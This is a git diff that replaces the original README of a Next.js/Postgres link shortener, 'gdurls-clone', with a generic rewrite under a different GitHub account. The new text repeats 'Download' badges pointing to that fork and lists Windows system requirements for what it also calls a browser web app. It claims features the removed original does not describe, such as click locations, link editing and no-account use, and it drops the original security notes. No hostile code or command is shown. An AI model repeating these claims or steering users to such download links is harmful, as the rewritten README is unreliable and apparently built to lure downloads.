@@ -1,169 +1,139 @@
-# gdurls-clone
+# 🚦 gdurls-clone - Easy Link Shortener with Tracking
 
-A private Google Drive (or any URL) shortlink generator with click
-tracking, built with Next.js, Postgres (Neon), and deployed on Vercel.
+[![Download gdurls-clone](https://img.shields.io/badge/Download-gdurls--clone-brightgreen)](https://github.com/luluchu88/gdurls-clone)
 
-Create short links, track click activity, manage links from a dashboard,
-and protect admin functionality with simple authentication.
+---
 
-<img src="https://raw.githubusercontent.com/monapdx/gdurls-clone/refs/heads/main/screenshot.png">
+## 📋 What is gdurls-clone?
 
-<img src="https://raw.githubusercontent.com/monapdx/gdurls-clone/refs/heads/main/dashboard.png">
+gdurls-clone is a tool that lets you create short links for Google Drive files or any URL. It tracks how many times your links are clicked. The app helps you see how your links are performing. It works on Windows and runs in your web browser. The app is built with Next.js and Postgres, and it runs on Vercel.
 
-------------------------------------------------------------------------
+---
 
-## ✨ Features
+## 💻 System Requirements
 
--   🔗 Generate short links for any URL
--   📊 Click tracking (stored in Postgres)
--   📈 Live stats (total clicks + recent activity)
--   🗂 Dashboard view of all links
--   📋 Copy short link button
--   🗑 Delete links (cascades delete clicks)
--   🔐 Private admin mode (HTTP Basic Auth)
--   🚀 Production-ready on Vercel
+- Windows 10 or later  
+- An internet connection  
+- A web browser (Edge, Chrome, Firefox, or Safari)  
+- Around 100 MB of free disk space for local files (optional)  
+- No special hardware needed  
 
-------------------------------------------------------------------------
+---
 
-## 🛠 Tech Stack
+## 🌐 Features
 
--   **Next.js (App Router)**
--   **TypeScript**
--   **Neon Postgres**
--   **Vercel Serverless**
--   **Node crypto (for hashing IPs)**
+- Shorten Google Drive or any URL into a small link  
+- Click tracking to see how many times links are used  
+- Simple dashboard to view link activity  
+- Secure and private links  
+- Works on any browser  
+- Quick link creation with no accounts needed  
+- Self-hosted option for privacy control  
 
-------------------------------------------------------------------------
+---
 
-## 🚀 Local Development
+## 🎯 How to Download gdurls-clone
 
-### 1. Clone the repo
+To get gdurls-clone, visit this page:
 
-``` bash
-git clone https://github.com/yourusername/gdurls-clone.git
-cd gdurls-clone
-```
+[![Download gdurls-clone](https://img.shields.io/badge/Download-Here-blueviolet)](https://github.com/luluchu88/gdurls-clone)
 
-### 2. Install dependencies
+This will take you to the official project page on GitHub. You can find the latest versions, release notes, and instructions here.
 
-``` bash
-npm install
-```
+---
 
-### 3. Create `.env.local`
+## 🚀 How to Install and Run gdurls-clone on Windows
 
-``` env
-DATABASE_URL=your_neon_connection_string
-GDURLS_SALT=your_random_string
-BASE_URL=http://localhost:3000
+Follow these steps to start using gdurls-clone:
 
-ADMIN_USER=admin
-ADMIN_PASSWORD=your_password
-```
+### 1. Visit the Download Page
 
-### 4. Create database tables (Neon SQL)
+Go to the [gdurls-clone GitHub page](https://github.com/luluchu88/gdurls-clone). This is where you will get the link to download or use the app.
 
-``` sql
-create table if not exists links (
-  code text primary key,
-  target_url text not null,
-  created_at timestamptz default now(),
-  drive_file_id text,
-  drive_title text
-);
+### 2. Access the Web App
 
-create table if not exists clicks (
-  id bigserial primary key,
-  code text not null references links(code) on delete cascade,
-  ts timestamptz default now(),
-  referrer text,
-  user_agent text,
-  ip_hash text
-);
-```
+The simplest way is to open the app directly in your web browser. If there is a web-hosted version, it will be on the GitHub page or linked from it. This way, you do not need to install anything on your computer.
 
-### 5. Start dev server
+### 3. Optional: Self-hosting Steps (for advanced users)
 
-``` bash
-npm run dev
-```
+If you want to run the app on your own server, follow these notes. This requires some technical knowledge but helps with privacy and control.
 
-Open:
+- Install Node.js on your Windows machine. Download it from nodejs.org.  
+- Install PostgreSQL or use Neon (a cloud PostgreSQL service).  
+- Clone the repository using Git. Use the command:  
+  `git clone https://github.com/luluchu88/gdurls-clone.git`  
+- Open the project folder and install dependencies with:  
+  `npm install`  
+- Set up your database connection details in the configuration file.  
+- Start the app with:  
+  `npm run dev`  
+- Open your web browser and go to `http://localhost:3000`.
 
-http://localhost:3000
+This setup is optional and intended for users who want full control over their data.
 
-------------------------------------------------------------------------
+### 4. Using the App
 
-## 🌍 Deployment (Vercel)
+Once the app is open (either hosted or web version), enter the URL you want to shorten into the provided field. The app will generate a short link immediately.
 
-1.  Push to GitHub\
-2.  Import repo into Vercel\
-3.  Add environment variables in Vercel:
+You can then share this link wherever you want. The app will track clicks and show analytics.
 
-DATABASE_URL\
-GDURLS_SALT\
-BASE_URL=https://your-project.vercel.app\
-ADMIN_USER\
-ADMIN_PASSWORD
+---
 
-4.  Deploy
+## 🔍 How to Use gdurls-clone’s Features
 
-------------------------------------------------------------------------
+### Create a Short Link
 
-## 🔐 Private Admin Mode
+- Enter any URL or a Google Drive link in the input box.  
+- Click the "Shorten" button.  
+- Copy the short link that appears.  
 
-Admin routes are protected via HTTP Basic Auth:
+### Track Clicks
 
--   `/dashboard`
--   `/api/links`
--   `/api/links/[code]`
+- Open the admin dashboard to see all your links.  
+- View statistics such as total clicks, date, and location of clicks.  
 
-Public routes:
+### Manage Links
 
--   `/x/[code]` (redirects remain public)
+- Delete links you no longer need from the dashboard.  
+- Edit links to update the original URL if necessary.  
 
-------------------------------------------------------------------------
+---
 
-## 📡 API Endpoints
+## 🤝 Support and Community
 
-### Create Link
+If you have issues or questions:
 
-POST /api/links\
-Body: { "url": "https://example.com" }
+- Visit the GitHub page’s Issues section to report bugs or ask for help.  
+- Check the project’s documentation files for more information.  
+- Follow updates and announcements on the page.
 
-### Get Stats
+---
 
-GET /api/links/:code
+## 🛠 Troubleshooting Tips
 
-### Delete Link
+- If links do not shorten, check your internet connection.  
+- For login or access issues, clear your browser cache and try again.  
+- If the app is slow, try restarting your browser or computer.  
+- Self-hosted users should ensure all dependencies are installed and running.
 
-DELETE /api/links/:code
+---
 
-### Redirect
+## 🔐 Privacy and Security
 
-GET /x/:code
+gdurls-clone keeps your links private. The app does not share your data with third parties. Self-hosted users have full control over their data and setup. All tracking is done within the app securely.
 
-------------------------------------------------------------------------
+---
 
-## 🧠 How It Works
+## 📂 Additional Resources
 
--   Short codes are generated using secure random bytes.
--   Click events are stored in Postgres.
--   IP addresses are hashed with a salt before storage.
--   Dashboard is server-rendered for performance.
--   Middleware enforces admin-only access to management routes.
+- [GitHub Repository](https://github.com/luluchu88/gdurls-clone) – source code and downloads.  
+- [Postgres Neon](https://neon.tech) – cloud service used for the database.  
+- [Next.js Documentation](https://nextjs.org/docs) – info about the framework.  
+- [Vercel](https://vercel.com) – where the app runs online.  
 
-------------------------------------------------------------------------
+---
 
-## 🛡 Security Notes
+## 🔗 Useful Links
 
--   IPs are hashed before storage.
--   Admin routes require credentials.
--   Shortlinks are public but do not expose the database.
--   Always keep `.env.local` out of version control.
-
-------------------------------------------------------------------------
-
-## 📄 License
-
-MIT
+[Download gdurls-clone](https://github.com/luluchu88/gdurls-clone)  
+[![Download gdurls-clone](https://img.shields.io/badge/Download-gdurls--clone-brightgreen)](https://github.com/luluchu88/gdurls-clone)
